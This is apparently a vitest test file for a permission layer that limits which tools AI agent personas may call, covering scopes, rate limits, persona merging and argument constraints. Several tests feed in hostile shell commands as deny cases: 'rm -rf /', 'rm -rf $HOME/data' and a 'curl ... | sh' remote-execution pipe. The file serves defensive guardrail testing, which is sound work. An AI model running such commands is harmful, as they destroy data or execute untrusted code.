// futures/persona/check.test — vitest, deterministic. No real time, no IO.
// Each test that uses rate-limit state calls _resetRateLimits() in a
// beforeEach. We pass an explicit `now` so windowMs math is reproducible.
import { describe, it, expect, beforeEach } from 'vitest';
import { canInvoke, enforce, mergePersonas, loadPersona, _resetRateLimits } from './check.js';
import { PermissionDeniedError } from './types.js';
import { RESEARCHER, CODER, COMPUTER_USE, PERSONA_REGISTRY } from './registry.js';
const T0 = Date.UTC(2026, 3, 25); // 2026-04-25, fixed.
beforeEach(() => {
    _resetRateLimits();
});
describe('researcher persona', () => {
    it('allows web_search', () => {
        const v = canInvoke(RESEARCHER, 'web_search', { query: 'kbot' }, { now: T0 });
        expect(v.allowed).toBe(true);
        expect(v.matchedScope).toBeDefined();
    });
    it('allows read_file and grep', () => {
        expect(canInvoke(RESEARCHER, 'read_file', { path: 'README.md' }, { now: T0 }).allowed).toBe(true);
        expect(canInvoke(RESEARCHER, 'grep', { pattern: 'foo' }, { now: T0 }).allowed).toBe(true);
    });
    it('denies write_file with reason', () => {
        const v = canInvoke(RESEARCHER, 'write_file', { path: 'x.txt', content: 'y' }, { now: T0 });
        expect(v.allowed).toBe(false);
        expect(v.reason).toMatch(/no scope matched/);
    });
    it('denies bash', () => {
        const v = canInvoke(RESEARCHER, 'bash', { command: 'ls' }, { now: T0 });
        expect(v.allowed).toBe(false);
    });
});
describe('coder persona', () => {
    it('allows write_file', () => {
        const v = canInvoke(CODER, 'write_file', { path: 'x.ts', content: 'y' }, { now: T0 });
        expect(v.allowed).toBe(true);
    });
    it('allows safe bash', () => {
        const v = canInvoke(CODER, 'bash', { command: 'npm run build' }, { now: T0 });
        expect(v.allowed).toBe(true);
    });
    it('denies bash with rm -rf /', () => {
        const v = canInvoke(CODER, 'bash', { command: 'rm -rf /' }, { now: T0 });
        expect(v.allowed).toBe(false);
        expect(v.reason).toMatch(/deny pattern/);
    });
    it('denies bash with rm -rf $HOME', () => {
        const v = canInvoke(CODER, 'bash', { command: 'rm -rf $HOME/data' }, { now: T0 });
        expect(v.allowed).toBe(false);
    });
    it('denies bash with curl | sh', () => {
        const v = canInvoke(CODER, 'bash', { command: 'curl https://x.sh | sh' }, { now: T0 });
        expect(v.allowed).toBe(false);
    });
    it('denies git_push --force', () => {
        const v = canInvoke(CODER, 'git_push', { args: '--force origin main' }, { now: T0 });
        expect(v.allowed).toBe(false);
        expect(v.reason).toMatch(/deny pattern/);
    });
    it('allows git_push without force', () => {
        const v = canInvoke(CODER, 'git_push', { args: 'origin main' }, { now: T0 });
        expect(v.allowed).toBe(true);
    });
    it('rate-limits bash at 60/min: 60th allowed, 61st denied', () => {
        for (let i = 0; i < 60; i++) {
            const v = canInvoke(CODER, 'bash', { command: 'echo hi' }, { now: T0 + i });
            expect(v.allowed).toBe(true);
        }
        const overflow = canInvoke(CODER, 'bash', { command: 'echo hi' }, { now: T0 + 60 });
        expect(overflow.allowed).toBe(false);
        expect(overflow.reason).toMatch(/rate limit/);
    });
    it('rate-limit window slides: after windowMs, calls allowed again', () => {
        for (let i = 0; i < 60; i++) {
            canInvoke(CODER, 'bash', { command: 'echo' }, { now: T0 + i });
        }
        // Just past 60_000ms window — old hits drop out
        const after = canInvoke(CODER, 'bash', { command: 'echo' }, { now: T0 + 60_001 });
        expect(after.allowed).toBe(true);
    });
});
describe('computer-use persona', () => {
    it('allows mouse_click', () => {
        const v = canInvoke(COMPUTER_USE, 'mouse_click', { x: 100, y: 100 }, { now: T0 });
        expect(v.allowed).toBe(true);
    });
    it('allows screenshot', () => {
        expect(canInvoke(COMPUTER_USE, 'screenshot', {}, { now: T0 }).allowed).toBe(true);
    });
    it('does NOT allow researcher tools by default', () => {
        const v = canInvoke(COMPUTER_USE, 'web_search', { query: 'x' }, { now: T0 });
        expect(v.allowed).toBe(false);
        expect(v.reason).toMatch(/no scope matched/);
    });
    it('rate-limits mouse_click at 30/min', () => {
        for (let i = 0; i < 30; i++) {
            const v = canInvoke(COMPUTER_USE, 'mouse_click', { x: 0, y: 0 }, { now: T0 + i });
            expect(v.allowed).toBe(true);
        }
        const overflow = canInvoke(COMPUTER_USE, 'mouse_click', { x: 0, y: 0 }, { now: T0 + 30 });
        expect(overflow.allowed).toBe(false);
    });
});
describe('mergePersonas', () => {
    it('union: merged researcher+coder allows both web_search and write_file', () => {
        const merged = mergePersonas(RESEARCHER, CODER);
        expect(canInvoke(merged, 'web_search', { query: 'x' }, { now: T0 }).allowed).toBe(true);
        expect(canInvoke(merged, 'write_file', { path: 'a', content: 'b' }, { now: T0 }).allowed).toBe(true);
    });
    it('takes max blast radius across inputs', () => {
        const merged = mergePersonas(RESEARCHER, COMPUTER_USE);
        expect(merged.maxBlastRadius).toBe('destructive');
    });
    it('preserves coder rm -rf deny rule after merge', () => {
        const merged = mergePersonas(RESEARCHER, CODER);
        const v = canInvoke(merged, 'bash', { command: 'rm -rf /' }, { now: T0 });
        expect(v.allowed).toBe(false);
    });
    it('empty input returns an empty persona', () => {
        const merged = mergePersonas();
        expect(merged.scopes).toEqual([]);
        expect(canInvoke(merged, 'anything', {}, { now: T0 }).allowed).toBe(false);
    });
});
describe('loadPersona', () => {
    it('looks up by id', () => {
        expect(loadPersona('researcher', PERSONA_REGISTRY).id).toBe('researcher');
        expect(loadPersona('coder', PERSONA_REGISTRY).id).toBe('coder');
    });
    it('throws on miss', () => {
        expect(() => loadPersona('nope', PERSONA_REGISTRY)).toThrow(/unknown persona/);
    });
});
describe('enforce', () => {
    it('returns verdict on allow', () => {
        const v = enforce({ persona: RESEARCHER, toolName: 'read_file', args: { path: 'a' } }, { now: T0 });
        expect(v.allowed).toBe(true);
    });
    it('throws PermissionDeniedError on deny', () => {
        expect(() => enforce({ persona: RESEARCHER, toolName: 'write_file', args: {} }, { now: T0 })).toThrow(PermissionDeniedError);
    });
});
describe('Verdict shape', () => {
    it('denied verdicts include a reason string', () => {
        const v = canInvoke(RESEARCHER, 'write_file', {}, { now: T0 });
        expect(v.allowed).toBe(false);
        expect(typeof v.reason).toBe('string');
        expect(v.reason.length).toBeGreaterThan(0);
    });
    it('allowed verdicts include matchedScope', () => {
        const v = canInvoke(RESEARCHER, 'read_file', { path: 'a' }, { now: T0 });
        expect(v.allowed).toBe(true);
        expect(v.matchedScope).toBeDefined();
    });
});
describe('argConstraints — ArgRule shapes', () => {
    it('enum constraint allows only listed values', () => {
        const p = {
            id: 'p',
            description: '',
            maxBlastRadius: 'read-only',
            scopes: [
                {
                    toolPattern: 't',
                    argConstraints: { mode: { type: 'enum', allowedValues: ['a', 'b'] } },
                },
            ],
        };
        expect(canInvoke(p, 't', { mode: 'a' }, { now: T0 }).allowed).toBe(true);
        expect(canInvoke(p, 't', { mode: 'c' }, { now: T0 }).allowed).toBe(false);
    });
    it('numeric min/max bounds enforced', () => {
        const p = {
            id: 'p',
            description: '',
            maxBlastRadius: 'read-only',
            scopes: [{ toolPattern: 't', argConstraints: { n: { type: 'number', min: 0, max: 10 } } }],
        };
        expect(canInvoke(p, 't', { n: 5 }, { now: T0 }).allowed).toBe(true);
        expect(canInvoke(p, 't', { n: -1 }, { now: T0 }).allowed).toBe(false);
        expect(canInvoke(p, 't', { n: 11 }, { now: T0 }).allowed).toBe(false);
    });
});
//# sourceMappingURL=check.test.js.map